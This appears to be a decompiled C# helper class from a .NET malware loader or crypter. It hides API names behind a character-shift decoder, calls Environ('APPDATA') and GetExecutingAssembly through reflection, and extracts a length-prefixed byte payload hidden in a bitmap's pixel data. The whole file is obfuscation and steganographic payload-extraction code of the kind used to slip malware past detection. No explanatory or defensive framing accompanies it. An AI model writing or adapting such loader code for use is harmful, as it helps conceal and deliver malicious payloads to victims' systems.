using System;
using System.Drawing;
using System.Reflection;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
public sealed class Tools
{
	public static string AppData => Conversions.ToString(typeof(Interaction).GetMethod(Strings.StrReverse(DcStr("ijmdqi@")), new Type[1] { typeof(string) })!.Invoke(null, new object[1] { DcStr(Strings.StrReverse("<O<?KK<")) }));

	public static Assembly Myself => (Assembly)typeof(Assembly).GetMethod(DcStr("B`o@s`^podib<nn`h]gt"))!.Invoke(null, new object[0]);

	public static string DcStr(string @string)
	{
		string text = string.Empty;
		int num = @string.Length - 1;
		for (int i = 0; i <= num; i++)
		{
			text += Conversions.ToString(Strings.Chr(Strings.Asc(@string[i]) + 5));
		}
		return text;
	}

	public static byte[] ReadDataFromBitmap(Bitmap bitmap)
	{
		byte[] array = new byte[((Image)bitmap).get_Width() * ((Image)bitmap).get_Height() * 3 - 1 + 1];
		int num = 0;
		for (int i = ((Image)bitmap).get_Height() - 1; i >= 0; i += -1)
		{
			int num2 = ((Image)bitmap).get_Width() - 1;
			for (int j = 0; j <= num2; j++)
			{
				Color pixel = bitmap.GetPixel(j, i);
				array[num * 3 + 2] = pixel.R;
				array[num * 3 + 1] = pixel.G;
				array[num * 3] = pixel.B;
				num++;
			}
		}
		byte[] array2 = new byte[BitConverter.ToInt32(array, 0) - 1 + 1];
		Buffer.BlockCopy(array, 4, array2, 0, array2.Length);
		return array2;
	}
}
